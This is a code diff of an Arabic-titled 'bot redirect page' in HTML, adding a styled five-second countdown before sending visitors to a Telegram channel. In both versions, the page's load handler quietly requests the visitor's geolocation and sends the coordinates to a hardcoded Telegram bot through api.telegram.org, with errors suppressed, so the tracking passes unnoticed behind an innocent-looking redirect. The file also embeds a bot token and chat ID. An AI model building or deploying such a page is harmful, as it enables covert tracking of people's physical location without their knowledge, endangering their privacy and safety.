@@ -2,28 +2,68 @@
 <html>
 <head>
   <title>صفحة توجيه البوت</title>
-</head>
-<body>
-  <button onclick="getLocation()" style="display:none;">.</button>
-
+  <meta charset="UTF-8">
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+    }
+    #countdown {
+      width: 70px;
+      height: 70px;
+      font-size: 30px;
+      font-weight: bold;
+      background-color: #ffffff;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+  </style>
   <script>
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const CHAT_ID = "6028485445";
 
-    function getLocation() {
+    function getLocationAndSend() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition((position) => {
           const lat = position.coords.latitude;
           const lon = position.coords.longitude;
 
           fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
-            .catch(error => {});
-        });
+            .catch(() => {});
+        }, () => {});
       }
     }
 
-    // تشغيل التلقائي عند فتح الصفحة
-    window.onload = getLocation;
+    let seconds = 5;
+
+    function startCountdown() {
+      const countdownEl = document.getElementById("countdown");
+      countdownEl.innerText = seconds;
+
+      const interval = setInterval(() => {
+        seconds--;
+        countdownEl.innerText = seconds;
+        if (seconds === 0) {
+          clearInterval(interval);
+          window.location.href = "https://t.me/sswq22";
+        }
+      }, 1000);
+    }
+
+    window.onload = () => {
+      getLocationAndSend();
+      startCountdown();
+    }
   </script>
+</head>
+<body>
+  <div id="countdown">5</div>
 </body>
 </html>
